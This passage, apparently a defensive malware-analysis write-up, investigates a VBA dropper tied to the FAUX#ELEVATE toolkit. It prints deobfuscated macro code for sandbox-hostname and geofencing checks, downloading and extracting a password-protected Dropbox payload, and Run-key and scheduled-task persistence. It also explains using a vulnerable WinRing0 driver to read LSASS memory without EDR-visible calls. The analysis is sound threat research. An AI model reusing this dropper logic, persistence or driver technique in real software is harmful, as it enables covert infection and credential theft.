> **Investigation Focus:** This is a working investigation, not a finished report. Every claim below is marked by how it was established: import tables and strings establish capability, a VirusTotal detonation or a published report from a related sample establishes corroboration, and neither is treated as proof of what this specific sample's own code does until that's traced directly. The open question at the end is left open because it actually is. All VirusTotal detection ratios cited below reflect the vendor count at the time of analysis; they will drift as vendors update signatures, and shouldn't be read as fixed values.

**TL;DR:** A VBA macro, obfuscated by assigning every string literal to a nonsense-word variable name instead of encoding it and padded with junk comment lines, gatekeeps on three checks before writing anything to disk: domain membership, a nine-entry hardcoded sandbox hostname blocklist spanning two distinct naming styles, and the host's country via a plaintext geolocation API, refusing Russia and the United States. Past the gate it downloads the real `7zr.exe` from `7-zip.org` and a password-protected archive from Dropbox, extracts four <Term concept="upx">UPX</Term>-packed executables plus a scheduled task definition, and installs two independent persistence mechanisms pointing at the same binary. `ms.exe` carries process-injection capability and gets 51/70 on VirusTotal with spyware/stealer-leaning labels, and its own sandbox detonation shows it calling the exact same geofencing endpoint as the macro. `RuntimeHost.exe` carries named Sandboxie/Cuckoo/VirtualBox/VMware checks, gets 24/70, and its detonation recorded a dropped `v32.dll` matching a string already in this capture's own VBA table. `info.exe`, initially assumed least interesting, carries a GUI-shaped import table unlike the other three and a self-signed certificate whose subject is the bare string `CN=DigiCert`, impersonating the CA rather than being issued by it, countersigned with a genuine DigiCert timestamp chain for superficial credibility; VirusTotal independently tags the packed hash `invalid-signature` and lands on 22/71. All three analyzed payloads converge on the same ESET `AIKJ` family suffix, and two share a `Draftor` family tag, additional clustering evidence on top of the shared archive and driver, though AV family labels remain supporting evidence rather than attribution. A vulnerable driver, `WinRing0x64.sys`, sits in the same folder with a hash that is byte-identical to one documented in Securonix's public FAUX#ELEVATE report, a related but not identical campaign that shares this capture's archive name, archive password, and binary-naming convention while diverging on at least one payload's actual hash; that related sample uses the driver for mining-performance MSR tuning, but this capture's own stealer-leaning vendor labels and absent miner binary make the driver's actual, better-documented <Term concept="byovd">CVE-2020-14979</Term> privilege-escalation path at least as plausible here, and that fork is where the investigation currently stands.

## Introduction

Most malware write-ups read like the ending was known from the start. This one is published closer to where the investigation actually stands: a first-stage script has been fully deobfuscated and its logic is well understood, three second-stage binaries have been triaged by import table, string, and VirusTotal corroboration, this capture overlaps enough with a named public campaign to be worth correlating directly, and one genuinely open question, which component is responsible for a vulnerable driver sitting in the same staging folder, has not been answered yet. That gap is left in deliberately, because the discipline that got the investigation this far is the same discipline that matters for the reader: a binary importing `VirtualAllocEx` and `WriteProcessMemory` has the *capability* for process injection, not proof of it, and a related sample's public report explaining what a byte-identical driver is used for is corroboration, not confirmation for this capture's own binaries. The difference only gets resolved by tracing what this specific code actually does, not by what it merely imports or what a related sample was found doing.

## Stage 0: A VBA Macro That Doesn't Encode, It Renames

The initial script is a VBA macro, and its obfuscation approach is unusual enough to be worth describing on its own. Rather than base64 or XOR-encoding its strings, every literal the script needs, URLs, registry paths, filenames, HTTP headers, is assigned once to a uniquely-named variable built from concatenated, grammatically plausible but meaningless English-looking words:

```vb
unnomadically_skewered_aristos_denials_germlike_wrenches_lowsest_supermechanically_recoverableness_rhythmicity_interdetermine_enureses = "https://www.dropbox.com/scl/fi/1k7ednk2dz21bvjy1i057/gmail2.7z?..."
```

The delivered file is padded far beyond that assignment block, almost entirely with junk comment lines built from real English sentence fragments rather than code, which is what actually defeats naive detection: a file that's mostly comments and nonsense-named assignments statistically resembles nothing in particular. The extraction method was mechanical rather than manual line-by-line reading: isolate every line that is not wrapped start-to-end in a quoted literal, since the junk padding is formatted as standalone commented or quoted filler and the handful of real executable lines are not, which collapses a file of that scale down to the actual logic in one pass. (A public writeup of a related campaign, discussed below, independently measured this same padding technique at 224,471 total lines with only 266 of them executable, which lines up with how disproportionate the padding felt here.)

Turning that filtered output into something readable was a small two-stage pipeline rather than a hand edit. The first pass is a short Python script that reads only the assignment block, splits each line into its variable name and literal, and resolves anything built with a VBScript `Replace(...)` call rather than a flat string, since a handful of the assigned values aren't plain literals at all but the result of a nested `Replace(Replace("...", "...", "..."), "...", "...")` expression, which meant writing a small recursive evaluator for VBScript's `Replace` semantics (including its 1-based `start` and `compare` parameters) rather than just reading the string off the line. The second pass is a general constant-propagation script: it builds a case-insensitive symbol table from every `variable = "literal"` assignment in the whole file, VBScript identifiers are case-insensitive, which matters for matching, then walks every other line and substitutes each variable reference with its literal value inline, skipping comments and the assignment lines themselves. The output of that second pass is what the code blocks in this post are drawn from, further retyped here with VBScript's own internal short helper-variable names (the macro's own `L5...L5`-style object references, distinct from the long nonsense-word string-literal names) left intact, since those are genuinely short and add no obfuscation value once the literals are resolved.

The rest of the script then reads as if every operation takes a meaningless argument, until each variable is resolved back to its assigned string. Once deobfuscated, the script's first real decisions are three checks, evaluated before anything gets written to disk, though they aren't all the same kind of check: the hostname blocklist and the geofencing call are hard abort conditions that end execution on a match, while the domain-membership/privilege check is a branch that decides how execution continues (elevate or not) rather than whether it continues at all. Every code block below is the script's real logic with the nonsense variable names resolved back to readable ones and the inline `CreateObject` ProgID strings substituted in; the control flow, comparisons, and literals are exactly as extracted, retyped for legibility rather than copy-pasted with 70-character variable names.

**Domain membership and privilege.** The script runs `Select * From Win32_ComputerSystem` over WMI and checks `PartOfDomain`. Combined with an admin-rights check (attempting a privileged registry read and catching the failure), this branches the script into different paths depending on whether it landed on a domain-joined, non-admin host versus an already-elevated one, each path re-launching itself through `ShellExecute` with the `runas` verb when elevation is needed:

```vb
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

Set wmiService = GetObject("winmgmts:\\.\root\cimv2")
Set computers = wmiService.ExecQuery("Select * From Win32_ComputerSystem")
isDomainJoined = False
For Each computer In computers
    isDomainJoined = computer.PartOfDomain
Next

Function IsAdmin()
    On Error Resume Next
    shell.RegRead("HKEY_USERS\S-1-5-19\Environment\TEMP")
    IsAdmin = (Err.Number = 0)
    Err.Clear
End Function
```

**A hardcoded sandbox hostname blocklist, in two distinct styles.** The script expands `%computername%` and compares it, by exact string match, against nine hardcoded values, not the four that stand out on a first read. Four follow a recognizable `DESKTOP-XXXXXXX` or named-PC pattern (`DESKTOP-D019GDM`, `DESKTOP-U05E4LC`, `DESKTOP-29MF6G4`, `JOHN-PC`), but five more are short, random-looking eight-character uppercase strings (`JRIWWBPD`, `ZLYTWMBI`, `LDWVFKWJ`, `ONUGVJVT`, `NCCZNUNV`) that don't resemble a normal Windows default hostname at all, closer to whatever a specific automated VM-provisioning or trial-sandbox platform defaults to. If the current hostname matches any of the nine, the script deletes itself and exits immediately:

```vb
computerName = shell.ExpandEnvironmentStrings("%computername%")
If computerName = "JOHN-PC" Or computerName = "LDWVFKWJ" Or computerName = "NCCZNUNV" _
   Or computerName = "DESKTOP-D019GDM" Or computerName = "JRIWWBPD" Or computerName = "ZLYTWMBI" _
   Or computerName = "ONUGVJVT" Or computerName = "DESKTOP-U05E4LC" Or computerName = "DESKTOP-29MF6G4" Then
    fso.DeleteFile WScript.ScriptFullName, True
    WScript.Quit
End If
```

None of these are generic patterns or heuristics, they are specific machine identifiers hardcoded directly into the macro. The pattern is consistent with hostnames harvested from prior analysis-environment or victim-environment encounters across more than one platform, MITRE's own documentation gives Mispadu terminating on the hostname `JOHN-PC` as a precedent for exactly this kind of hardcoded entry, but this sample's list hasn't been independently traced to a specific source, and the exact provenance of all nine entries can't be established from the sample alone.

**Geofencing by IP geolocation.** The script requests `http://ip-api.com/csv/?fields=countryCode`, a legitimate, free, unauthenticated geolocation API, over plain HTTP, and compares the returned two-letter code against `RU` and `US`. A match causes a silent exit before any payload is downloaded:

```vb
Function GetCountry()
    Dim xmlhttp
    Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    On Error Resume Next
    xmlhttp.Open "GET", "http://ip-api.com/csv/?fields=countryCode", False
    xmlhttp.Send
    If Err.Number <> 0 Or xmlhttp.Status <> 200 Then
        GetCountry = "??"
        Exit Function
    End If
    GetCountry = Replace(Replace(xmlhttp.ResponseText, vbCr, ""), vbLf, "")
End Function

If GetCountry() = "RU" Or GetCountry() = "US" Then
    WScript.Quit
End If
```

## Staging: A Real 7-Zip Binary and a Password-Protected Archive

Once past the gates, the macro's staging behavior is simple and leans on legitimate infrastructure to stay quiet. It downloads `7zr.exe` directly from `https://www.7-zip.org/a/7zr.exe`, the official 7-Zip distribution URL, not a lookalike domain, which means this specific download is not something a defender can usefully blocklist by source alone. The official release is code-signed by 7-Zip's maintainer, Igor Pavlov, though this investigation verified the source URL rather than independently re-checking the Authenticode signature on this specific downloaded copy. It then downloads `gmail2.7z` from a direct Dropbox share link, and extracts it using the freshly downloaded `7zr.exe` with the command-line flags `e -p1625093 -y -o` (the archive password is in cleartext in the macro's own string table), into `%PUBLIC%\WindowsUpdate\`:

```vb
Call ShellExecuteAndWait("https://www.7-zip.org/a/7zr.exe", publicFolder & "\7zr.exe")
Call DownloadFile("https://www.dropbox.com/scl/fi/1k7ednk2dz21bvjy1i057/gmail2.7z?rlkey=0qbro7zvrrrm2kk40ssqvz4hk&st=qu0wegin&dl=1", _
                   publicFolder & "\WindowsUpdate\gmail2.7z")

shell.Run publicFolder & "\7zr.exe e -p1625093 -y -o" & Chr(34) & publicFolder & "\WindowsUpdate" & Chr(34) & _
          " " & Chr(34) & publicFolder & "\WindowsUpdate\gmail2.7z" & Chr(34), 0, 0
```

The archive yields five files: `ms.exe`, `RuntimeHost.exe`, `mservice_L.exe`, `info.exe`, and `st.xml`, a scheduled task definition the macro feeds straight to `schtasks.exe /create`.

## Persistence: Two Independent Mechanisms, One Target

The macro installs two separate persistence mechanisms, and both point at the same binary, `mservice_L.exe`.

**A Run key.** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Media Service` is written to point at `%PUBLIC%\WindowsUpdate\mservice_L.exe`, triggering on every interactive logon for the current user.

**A scheduled task.** `st.xml`, extracted from the archive, is registered via `schtasks.exe /create /f /tn MicrosoftUpdateService /XML <path>`. The task itself (read directly from the XML) runs `%public%\windowsupdate\mservice_l.exe` on a 10-minute repeating interval starting from a fixed boundary, with `RunLevel` set to `HighestAvailable`, meaning it inherits the full privilege level of whichever account the task runs under, no further elevation prompt required on each of those 10-minute firings:

```vb
shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Media Service", _
               Chr(34) & publicFolder & "\WindowsUpdate\mservice_L.exe" & Chr(34), "REG_SZ"

Call ShellExecuteAndWait("cmd.exe", "/c schtasks.exe /create /f /tn MicrosoftUpdateService /XML " & _
                          Chr(34) & publicFolder & "\WindowsUpdate\st.xml" & Chr(34))
```

```xml
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <TimeTrigger>
      <Repetition><Interval>PT10M</Interval><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>
      <StartBoundary>2023-02-05T14:31:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal>
  </Principals>
  <Actions Context="Author">
    <Exec>
      <Command>%public%\windowsupdate\mservice_l.exe</Command>
    </Exec>
  </Actions>
</Task>
```

## The Four Payloads: Capability, Not Yet Confirmed Behavior

All four extracted executables are <Term concept="upx">UPX</Term>-packed, confirmed by the presence of `UPX0`/`UPX1` (and, for `info.exe`, a third `UPX2`) sections carrying the packer's characteristic section flags, and trivially unpacked with `upx -d`. What follows is import-table and string-level triage for each, with the capability-versus-behavior distinction preserved deliberately, since that distinction is the actual finding at this stage, not a hedge. Everything in this section is static analysis only, hashing, PE parsing, string extraction, and parsing the one embedded Authenticode signature block, against the files at rest. None of the samples has been executed.

A generic web search turns up nothing for `WinRing0x64.sys`'s hash (a different story, covered in the correlation section below), but both `ms.exe` and `RuntimeHost.exe` have VirusTotal records worth reading closely, and one detail from `ms.exe`'s record is a direct behavioral confirmation rather than a hint.

`RuntimeHost.exe`'s hash gets 24 of 69 vendor detections, with no consensus on a specific family: Microsoft calls it `Trojan:Win32/Wacatac.B!ml`, ESET calls it `Win32/Agent.AIKJ`, and the largest cluster (BitDefender, Arcabit, GData, eScan, VIPRE, Emsisoft) labels it generically as `Draftor`, all either generic or ML-confidence detections rather than a named, well-understood malware family, consistent with a loader component that isn't widely circulated. Two details from VirusTotal's own sandbox detonation corroborate this investigation's own findings independently: a community YARA match on `INDICATOR_SUSPICIOUS_EXE_SandboxProductID` and `INDICATOR_SUSPICIOUS_EXE_SandboxHookingDLL` lines up exactly with the named Sandboxie/Cuckoo/VirtualBox strings found by hand below, and the sandbox run recorded one dropped file, `v32.dll`, which matches the `\v32.dll` path string already present in this investigation's own VBA string table (assigned alongside `\katyusha_V`), tying the macro's own internal naming directly to a file `RuntimeHost.exe` actually writes to disk. The same detonation also recorded two contacted IP geolocation services, `api.myip.com` and `ipinfo.io`, and outbound contact to `5.139.44.126` and `5.139.44.127`, both on AS12389 (Rostelecom) in Russia. Pivoting on the pair directly is far more informative than either IP alone: VirusTotal lists 32 distinct communicating files, identical across both `.126` and `.127`, indicating the two addresses are used interchangeably rather than independently. The large majority are literally named `RuntimeHost`, `RuntimeHost.exe`, `RuntimeHost.exe.exe`, or `RuntimeHost_unpacked.exe`, with detection ratios ranging from 22/69 to 53/70, alongside a handful of differently-named siblings (`rth_b.exe`, `f5fltz62.exe`, `8jlsg6.exe`, `3p73tojr.exe`, `7sb2ld.exe`) that read as the same short-random-string naming convention seen elsewhere in this investigation, plus a few submitted only by their own hash. The submission dates span 2026-06-16 through 2026-10-06, today, with another hit the day before at 43/71. That turns a single sandbox-detonation contact into evidence of standing, actively maintained operator infrastructure rather than an incidental or transient address: this pair has been receiving freshly built `RuntimeHost` variants for nearly four months and is still doing so as of this writing. The sample's first recorded submission filename was `исполняемый.exe`, Russian for "executable.exe," stored as mojibake in VirusTotal's metadata. The hash also appears, per community comments, in a multi-sample batch submission tagged with several unrelated commodity family names (Amadey, Elex, GlassWorm, Luca Stealer, njRAT); that tag describes the submission bundle those researchers uploaded together, not a confirmed family classification of this specific binary, and is listed here as a pivot point rather than an attribution.

`ms.exe`'s hash gets a much higher 51 of 70 vendor detections, and the labels lean spyware/stealer rather than generic: Kaspersky calls it `Trojan-Spy.Win32.Agent`, VBA32 calls it `BScope.TrojanPSW.Stealer`, Antiy calls it `Trojan[PSW]/Win32.Convagent`, and ESET again lands on the same `AIKJ` suffix it gave `RuntimeHost.exe`, two vendors converging on the same family tag for two different binaries from the same staged folder is a second, independent line of evidence for the toolkit-correlation argument above, separate from the shared archive password and driver hash. VirusTotal's behavioral tags for this sample include `detect-debug-environment`, `calls-wmi`, and `spreader`, and the sandbox run recorded one outbound HTTP request that matters more than any string in the import table: `http://ip-api.com/csv/?fields=countryCode`, the exact same geofencing endpoint, same path, same query parameter, that the VBA macro itself queries before downloading anything. That is not a shared library coincidence, it is `ms.exe` independently re-running the operator's own geolocation check at the binary stage, after the macro already ran the same check once. The sandbox run also recorded one dropped file, a copy of the legitimate `taskkill.exe`, consistent with the process-termination capability the import table already suggested via `TerminateProcess`.

**`ms.exe`** carries the specific API sequence that constitutes <Term concept="process-injection">process injection</Term> capability: `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, and `ReadProcessMemory`, alongside `CreateProcessW` paired with `CreatePipe`, suggesting a parent-child process relationship with redirected I/O. It also imports the full BCrypt and legacy CryptoAPI surface (`BCryptEncrypt`/`Decrypt`, `BCryptGenerateKeyPair`, `CryptAcquireContext`), consistent with either protecting its own configuration or implementing a custom protocol. The decisive question, whether the `VirtualAllocEx` → `WriteProcessMemory` sequence is followed by anything that actually transfers execution into the target process (a new remote thread, an overwritten entry point, an APC), has not yet been traced in the disassembler and is explicitly marked unresolved; the VirusTotal spyware/stealer labels above raise the stakes of that question without answering it.

**`RuntimeHost.exe`** (SHA-256 `da7346fd679cf3242903c380e4380b22e53278f1476e859a78ca3d7a97100df6`) is the most explicit of the three. Its strings include named, product-specific sandbox and VM artifacts rather than generic indicators: `Sandboxie_SingleInstanceMutex_Control`, `SBIE_BOXED_ServiceInitComplete_Mutex1`, `\??\C:\Cuckoo`, `\??\pipe\cuckoo`, `\??\VBoxMiniRdrDN`, `\??\VBoxTrayIPC`, `\??\HGFS`, and `VmGenerationCounter`, alongside hardware-fingerprinting registry reads under `HARDWARE\DESCRIPTION\System\BIOS` and `SYSTEM\CurrentControlSet\Enum\{PCI,USB,HDAUDIO}`. It links a substantial embedded libcurl and libssh2 implementation (HTTP, HTTPS, FTP, SFTP, SOCKS4/5), and the same BCrypt/CryptoAPI surface as `ms.exe`. None of the networking or crypto strings alone prove the sample's own code calls them, both libraries carry large amounts of code that simply ships unused, which is exactly why the next step for this binary is tracing application-level callers into the library rather than the library's own internals.

**`mservice_L.exe`** is a 32-bit PE compiled with PureBasic (confirmed by `PB_*` runtime strings), 546 KB, with a manifest requesting `requireAdministrator`, no exports, and no debug symbols. It is the binary both persistence mechanisms target, which makes it the investigation's current center of gravity. It carries a full registry API surface (`RegCreateKeyW`, `RegSetValueExW`, `RegOpenKeyExW`), process creation (`CreateProcessW` with a direct call site already located), GUI/tray functionality (`Shell_NotifyIconW`, a direct call site located), and the same large embedded libcurl/libssh2 footprint as `RuntimeHost.exe`. Given that it is the explicit target of both persistence mechanisms, the single highest-priority open question for this binary is what command line it actually passes to `CreateProcessW`, since that will establish whether it is a pure watchdog/launcher for the other two binaries or does independent work of its own.

**`info.exe`** was the first binary looked at in this investigation, on the reasoning that it looked the least interesting and was worth crossing off quickly; it turned out to be the opposite. Its import table is a 32-bit GUI surface unlike anything in the other three payloads: `gdiplus.dll`, `ole32.dll` (`OleInitialize`), `COMCTL32.dll` (`InitCommonControlsEx`), `GDI32.dll` (`GetDC`/`DeleteDC`), `SHELL32.dll` (`ShellExecuteW`), and `WINMM.dll` (`timeBeginPeriod`), the shape of a small Windows GUI utility rather than a headless implant. Each DLL contributes exactly one declared import, `KERNEL32.DLL` supplies `LoadLibraryA`, `GetProcAddress`, and `VirtualProtect`, and nothing else is statically resolved, the same minimal-declared-imports-plus-runtime-resolution pattern already established for `ms.exe`, `RuntimeHost.exe`, and `mservice_L.exe`, now showing up in a fourth, differently-shaped binary from the same build pipeline. It declares no resource directory at all, no icon, no version info, which is unusual for something importing a GUI/common-controls surface and is itself worth a note for whoever reverses it next.

The actually interesting finding is in the file's Authenticode structure. `info.exe` carries a populated `IMAGE_DIRECTORY_ENTRY_SECURITY` entry, a real `WIN_CERTIFICATE`/PKCS#7 `SignedData` blob, not the leftover certificate-handling strings a UPX stub's TLS code can otherwise mislead you into expecting. Parsing it directly with `openssl asn1parse` shows a `SPC_INDIRECT_DATA_OBJID` structure (the standard Authenticode content type) hashing the PE with SHA-256, followed by a certificate chain. The signing certificate itself has `issuer = CN=DigiCert` and `subject = CN=DigiCert`, identical, meaning it is self-signed, carries an RSA key and an Extended Key Usage extension explicitly scoped to `1.3.6.1.5.5.7.3.3` (code signing), and has a validity window of 2026-07-20 to 2027-07-20. Real DigiCert-issued code-signing certificates carry a full subject (organization, locality, country); a certificate whose entire subject is the bare string `DigiCert` is not one DigiCert issued, it is a self-signed certificate that borrows the CA's name as its common name. Layered on top of that is a second, genuine certificate chain, DigiCert's actual RFC3161 timestamping authority (`DigiCert Assured ID Root CA` → `DigiCert Trusted Root G4` → a 2025 TimeStamping CA → a 2026 Timestamp Responder), which only timestamps when the signature was applied; it does not vouch for the signing certificate's identity. The practical effect is a binary that can present *something* in a Windows digital-signature properties dialog, with a brand name a casual reader would recognize, while actually chaining to nothing a trust store would accept. That is a distinct anti-analysis technique from everything else in this investigation so far: the hostname list, the domain check, and the geofencing call are all aimed at automated sandboxes, while a spoofed-but-plausible-looking signature is aimed at a human who glances at file properties before deciding whether to run something.

VirusTotal agrees with both halves of that read independently. The packed hash gets 22/71 detections and is tagged `invalid-signature` directly, alongside `upx` and `overlay`, VirusTotal's own parser reached the same conclusion about the certificate without seeing this investigation's ASN.1 dump. The popular threat label is `trojan.draftor/aikj`: ESET-NOD32 calls it `Win32/Agent.AIKJ`, the identical family suffix already shared by `ms.exe` and `RuntimeHost.exe`, and ALYac, BitDefender, Emsisoft, eScan, GData, and VIPRE all land on `Gen:Variant.Draftor.5598`, the same `Draftor` cluster already seen on `RuntimeHost.exe`. That makes `info.exe` a third convergence point for the toolkit-correlation argument: three of the four extracted payloads share the AIKJ suffix, and two share the Draftor family tag. That's additional clustering evidence on top of the shared archive and driver, not attribution on its own, AV family labels reflect each vendor's own classification model rather than an independently verifiable ground truth. Unpacking the sample with `upx -d` (a transform on the file at rest, not an execution of it) for completeness gives a decompressed hash of `eaca491e4cea32473d4f4a082797c40dc14a3908ba4cd6f65ac2cd77dbc815b5`; the unpacked copy's own Authenticode digest no longer matches its content, which is expected and not itself a new finding, since the signature was computed over the packed file as shipped. Neither the packed nor the unpacked copy contains `WinRing0`, `DeviceIoControl`, `OpenSCManager`, `CreateServiceW`, `StartServiceW`, or any `.sys` string, so unlike the other three payloads, `info.exe` is not currently a candidate caller into `WinRing0x64.sys` and is left out of that part of the investigation below.

Submitting both hashes for analysis adds two more independent confirmations. VirusTotal's own behavioral engines (CAPA's static capability detection and the CAPE sandbox's dynamic detonation) both flag `Subvert Trust Controls` on the packed hash, the same technique this investigation reached by hand from the raw ASN.1, plus `Obfuscated Files or Information` and `Masquerading`. The sandbox trace also resolves a detail the static import table alone couldn't: `info.exe` declares `LoadLibraryA`/`GetProcAddress` and nothing else security-relevant at the import-table level, yet the detonation records an actual call to `IsDebuggerPresent` (alongside `GetTickCount`), which means that API is being resolved dynamically at runtime exactly as the minimal-declared-imports pattern predicted, not statically imported the way it is in `ms.exe` and `mservice_L.exe`. The sandbox also recorded a created mutex, `Vladimird*ex$sds412121`, a specific enough string to be worth tracking as its own IOC, and registry reads under `...\Themes\Personalize` and `...\Control\Lsa\FipsAlgorithmPolicy`, consistent with a GUI application checking the system's light/dark theme and FIPS-compliant-algorithm enforcement before deciding how to render or which crypto mode to use, plausible but not confirmed as anti-analysis on its own. The unpacked hash, submitted separately, gets a higher 30/71 (detection naturally improves once UPX's obfuscation is stripped), keeps the same `AIKJ`/`Draftor` family convergence, and adds a fourth cross-payload match: Microsoft calls it `Trojan:Win32/Wacatac.B!ml`, the identical label Microsoft already gave `RuntimeHost.exe`.

## A Related, Not Identical, Public Campaign: FAUX#ELEVATE

Securonix published a detailed report in March 2026 on a campaign they named <Term concept="geofencing-malware">FAUX#ELEVATE</Term>: fake-résumé VBScript lures against French-speaking enterprises, a domain-join gate, a two-stage Dropbox-hosted toolkit (`gmail2.7z` for data theft and mining, `gmail_ma.7z` for persistence and cleanup, both under the same `1625093` archive password), a Monero miner, Chromium App-Bound Encryption bypass tooling, and mail.ru-based exfiltration. That is close enough to this capture, in enough specific, low-entropy details, to be worth laying out side by side rather than treating as a coincidence, while being explicit that this is correlation to a related toolkit, not a claim that the two captures are the same intrusion.

What matches, specifically:

- The archive filename, `gmail2.7z`, and its password, `1625093`, are identical.
- The binary naming convention overlaps directly: `RuntimeHost.exe` appears in both; Securonix's `mservice.exe` and this capture's `mservice_L.exe` share the same root name with a differing suffix.
- `WinRing0x64.sys` is present in both, and here the match is exact rather than approximate: this capture's driver hashes to `11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5`, the identical SHA-256 Securonix published for the same filename in their own IOC list. Since this is a legitimate, redistributable third-party driver rather than custom-built malware, an identical hash mostly confirms both operators pulled the same public file rather than proving a shared build pipeline, but it is still the cleanest point of overlap between the two captures.
- The initial-stage gating logic matches in kind, if not in exact values: a WMI domain-join check, a hardcoded sandbox-hostname blocklist, and self-deletion on a mismatch, a structure similar to what Securonix describes for their VBScript dropper. Matching structure is weaker evidence than matching literal values (the archive name, password, and driver hash above), gating logic built from a domain check plus a hostname blocklist is common enough across unrelated loaders that structural similarity alone wouldn't carry this argument; it's included here as one more data point layered on the stronger literal matches, not as independent proof by itself.
- ESET's own detection engine independently clusters `ms.exe` and `RuntimeHost.exe`, the two payloads from this capture with VirusTotal records, under the same `Agent.AIKJ` family suffix, a signal from a vendor's classification model rather than anything in this investigation's own methodology, pointing the same direction as the shared archive password and driver hash.

What diverges, specifically:

- `RuntimeHost.exe` does not match. Securonix's copy hashes to `853d8001c173520a7f459be73ac6bb7f0363db3beb7632f0a6059fb88b288b6a`; this capture's copy hashes to `da7346fd679cf3242903c380e4380b22e53278f1476e859a78ca3d7a97100df6`. Same filename, same general capability profile (anti-sandbox, networking, crypto), different build.
- Securonix's report describes `mservice.exe` directly as the Monero miner, launched with mining configuration pulled from a compromised Moroccan WordPress site. This capture's `mservice_L.exe` is a PureBasic GUI/tray application with a `requireAdministrator` manifest, not obviously a miner binary by import table alone, and is the explicit target of both persistence mechanisms here. Whether `mservice_L.exe` in this capture plays the launcher role for a miner it hasn't dropped yet, or is a distinct component in a related but differently-structured build, is unresolved.
- Second-archive, credential-theft, and exfiltration infrastructure described by Securonix (`gmail_ma.7z`, the ChromElevator-based ABE-bypass tooling, `mozilla.vbs`, `walls.vbs`, mail.ru SMTP exfiltration to specific sender and recipient addresses) has no counterpart identified in this capture so far. That may mean this capture represents an earlier or leaner stage of the same toolkit, a different operator reusing shared components, or simply that those pieces exist in this chain too and haven't been located yet.

The practical read: the evidence establishes a strong technical relationship, not attribution. An identical archive name, an identical archive password, and a byte-identical driver file are hard to explain as two unrelated authors independently landing on the same values by chance, so this is very likely the same underlying loader toolkit. Whether that means the same operator, a closely related operator sharing components, or a third party reusing a leaked or sold toolkit is a separate question this evidence doesn't resolve, and isn't claimed here. It is also not evidence that this specific capture's `mservice_L.exe` is confirmed to be a cryptominer, that conclusion belongs to the Securonix sample, not this one, until this capture's own binary is traced.

## The Open Question: WinRing0x64.sys, Two Real Hypotheses

The same staged folder containing the three payloads also contains `WinRing0x64.sys`, a driver with a well-documented vulnerability: <Term concept="byovd">CVE-2020-14979</Term>, a NULL-DACL device object in WinRing0 (as bundled with EVGA Precision X1 versions through 1.0.6) that lets any local process, including a low-integrity one, map `\Device\PhysicalMemory` and read or write arbitrary physical memory, which is sufficient for a local privilege escalation to `NT AUTHORITY\SYSTEM`. Calling it a signed driver is a statement about kernel-loading mechanics, a 64-bit Windows kernel will refuse to load an unsigned driver at all, not a statement about trustworthiness: the signature establishes who built the driver, not that using it here is safe, and BYOVD as a technique specifically exists because a legitimately signed driver with a real vulnerability clears that loading bar. WinRing0 is genuinely dual-use at the driver level, the same binary exposes both MSR (Model-Specific Register) read/write IOCTLs and arbitrary physical-memory read/write IOCTLs, so the driver's presence alone does not favor one explanation over the other. Which one applies here comes down to which IOCTL code whichever responsible binary actually issues, and that hasn't been traced yet, which makes this a genuine fork between two concrete hypotheses rather than one confirmed answer with an unconfirmed loader.

**Hypothesis A: mining performance tuning.** This is the explanation Securonix documents for the byte-identical driver file in the related FAUX#ELEVATE toolkit, loaded to expose MSRs so a Monero miner can tune RandomX performance, a pattern well-documented in XMRig-derived miners and unrelated to CVE-2020-14979's actual vulnerability. Given the identical driver hash, this transfers as plausible corroboration, but it leans on an assumption this capture doesn't actually support well: Securonix's sample has a confirmed miner binary, `mservice.exe`, described directly as the Monero cryptominer. This capture has no binary that presents that way. `mservice_L.exe` here is a PureBasic GUI/tray application, not an obvious miner by import table, and no mining-pool, Stratum-protocol, or XMRig-pattern strings have turned up in any of the three payloads so far.

**Hypothesis B: credential-access privilege escalation, the vulnerability CVE-2020-14979 actually describes.** A physical-memory read primitive is a real, documented technique specifically for dumping LSASS and other protected process memory without ever calling `OpenProcess` against it, which is exactly the call EDR products hook hardest. Reading credential material through a vulnerable driver's memory-mapping primitive instead sidesteps that entire detection surface. This hypothesis fits this capture's own evidence noticeably better than Hypothesis A does: `ms.exe`'s VirusTotal labels skew heavily toward spyware and password-stealing (`Trojan-Spy.Win32.Agent`, `BScope.TrojanPSW.Stealer`, `Trojan[PSW]/Win32.Convagent`, a verdict that literally contains the word "stealer"), not toward coin-mining, and `RuntimeHost.exe`'s credential-adjacent API surface noted earlier (`GetUserNameW`, `QueryCredentialAttributes`) points the same direction. If this build of the toolkit is oriented around credential theft rather than mining, a driver that lets it read protected memory without an EDR-visible `OpenProcess` call is a far more coherent fit than CPU tuning for a miner that doesn't appear to exist in this capture.

Both hypotheses are real, neither is confirmed, and they aren't mutually exclusive, since a well-resourced related toolkit using the same driver for mining in one build and credential access in another is entirely plausible for the same underlying builder. Resolving it for this specific capture requires finding, in whichever binary is responsible, the pattern of `CreateFileW` against a device path (`\\.\WinRing0_1_2_0` is the driver's documented symbolic link name) followed by `DeviceIoControl`, or, if the driver is being installed as a service first, a `CreateServiceW`/`StartServiceW`/`OpenSCManagerW` sequence that precedes it, and then reading the specific IOCTL code passed, MSR read/write points toward Hypothesis A, physical-memory read/write toward Hypothesis B.

## Conclusion

The headline finding of this investigation isn't any single technique, it's how early and how cheaply the anti-analysis logic runs, and how much a password and a driver hash can establish without ever claiming more than they actually prove. Sandbox and geography checks that happen in a VBA macro, before any packed binary touches disk, and then get independently re-run by one of the payloads itself at execution, are nearly free for the operator and expensive for a defender to work around. The correlation to FAUX#ELEVATE is the same discipline applied one level up: an identical archive name, an identical archive password, and a byte-identical driver file are strong enough evidence to call this the same toolkit, while a differing RuntimeHost.exe hash and an unconfirmed role for mservice_L.exe are reason enough not to call it the same intrusion, and reason enough to question rather than inherit the related sample's own conclusion about what that identical driver is actually for here. The capability-versus-behavior distinction carried through every payload section held up under new evidence rather than needing to be walked back: VirusTotal's own detonations corroborated the sandbox-detection and geofencing findings independently, surfaced two things pure static analysis hadn't (`RuntimeHost.exe` dropping `v32.dll` and `ms.exe` calling out to the 